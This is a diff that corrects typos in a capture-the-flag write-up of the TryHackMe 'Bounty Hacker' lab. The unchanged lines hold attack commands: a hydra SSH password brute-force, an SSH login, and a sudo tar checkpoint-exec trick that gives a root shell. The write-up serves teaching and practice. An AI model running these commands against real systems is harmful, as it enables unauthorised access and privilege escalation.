@@ -30,7 +30,7 @@ We can download the files with the following command
 get <FILE_NAME>
 ```
 
-From the `task.txt` we have found a name which is probably a user and `locks.txt` looks like password wordlist. Let's try to bruteforce ssh using hydra.
+From the `task.txt` we have found a name which is probably a user likewise `locks.txt` looks like password wordlist. Let's try to bruteforce ssh using hydra.
 
 ```
 hydra -l lin -P locks.txt 10.10.126.63 ssh
@@ -38,7 +38,7 @@ hydra -l lin -P locks.txt 10.10.126.63 ssh
 
 ![hydra](/assets/images/thm/bounty-hacker/hydra.png)
 
-Yep, as we though that was a wordlist. Now SSH to the machine.
+Yep, as we thought it was a password wordlist. Now SSH to the machine.
 
 ```
 ssh lin@<IP>
@@ -46,7 +46,7 @@ ssh lin@<IP>
 
 ![shell](/assets/images/thm/bounty-hacker/shell.png)
 
-Here is the first flag. Now we need to find way to escalate our privileges. The first thing that I awlays check is whether the current user has any permissions to execute sudo commands.
+Here is the first flag. Now we need to find way to escalate our privileges. The first thing that I always check is whether the current user has any permissions to execute sudo commands.
 
 ```
 sudo -l
@@ -58,7 +58,7 @@ We are in luck. Lin user has the right to execute `/bin/tar` as sudo. Go and vis
 
 ![gtfobins](/assets/images/thm/bounty-hacker/gtfobins.png)
 
-Yes, it is as simple as that, just copy the command and execute it and you will have root acces.
+Yes, it is as simple as that, just copy the command and execute it and you will have root access.
 
 ```
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
